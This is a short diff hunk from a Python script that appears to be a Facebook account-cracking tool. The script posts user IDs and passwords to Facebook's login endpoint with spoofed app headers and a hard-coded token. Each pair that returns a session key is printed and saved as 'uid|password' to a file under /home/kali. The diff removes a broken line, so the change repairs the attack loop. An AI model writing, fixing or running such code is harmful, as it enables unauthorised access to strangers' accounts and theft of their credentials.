@@ -191,7 +191,6 @@ def file_subb(uid,pwx):
 'X-FB-Server-Cluster': 'True',
 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
             q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
-            q=json.loads(p)
             if "session_key" in q:
                 print(f"\r\r  [OK] {uid} | {ps}      ")
                 open("/home/kali/EhcEmran-Ok.txt","a").write(uid+"|"+ps+"\n")
